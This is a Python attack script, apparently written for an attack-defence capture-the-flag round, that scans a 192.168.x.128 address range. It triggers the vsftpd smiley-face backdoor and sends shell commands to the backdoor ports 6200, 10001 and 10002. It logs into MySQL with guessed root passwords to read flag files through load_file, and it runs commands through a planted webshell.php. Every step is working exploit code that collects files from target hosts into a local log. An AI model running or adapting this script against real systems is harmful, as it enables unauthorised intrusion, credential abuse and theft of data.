import socket
import threading,time
import MySQLdb
import requests
def check(ip):
    try:
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((ip,21))
        s.settimeout(3)
        s.sendall('USER root:)\n')
        s.sendall('PASS toor\n')
        s.close()
    except:
        pass
def exploit(ip,port):
    try:
        e = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        e.connect((ip,port))
        e.settimeout(10)
        cat="cat /root/flag* \n"
        cated=cat.encode()
        e.sendall(cated)
        flag = e.recv(50000)
        e.close()
        data=open("/root/123.txt","a")
        print("[IP]:{} [FLAG]:{}".format(ip,flag),file=data)
        data.close()
    except:
        pass
def mysqld(ip):
    try:
        conn=MySQLdb.connect(host=ip,user='root',passwd='rrroot',connect_timeout=10)
        cursor=conn.cursor()
        sql='select load_file("c://flag.txt")'
        try:
            data=open("/root/123.txt","a")
            cursor.execute(sql)
            flag=cursor.fetchall()
            print("[IP]:{} [FLAG]:{}".format(ip,flag),file=data)
            conn.close()
        except:
            pass
    except:
        pass
def webshell(ip):
    try:
        url="http://"+ip+"/webshell.php?cmd=type c:\\flag.txt"
        r=requests.get(url)
        flag=r.text
        data=open("/root/123.txt","a")
        print("[IP]:{} [FLAG]:{}".format(ip,flag),file=data)
    except:
        pass
if __name__ == '__main__':
    for i in range(69,255):
        ip="192.168."+str(i)+".128"
        check(ip)
        ko=[6200,10001,10002]
        for port in ko:
            exploit(ip,port)
        t=threading.Thread(target=mysqld,args=(ip,))
        t.start()
        t1=threading.Thread(target=webshell,args=(ip,))
        t1.start()
        print(i)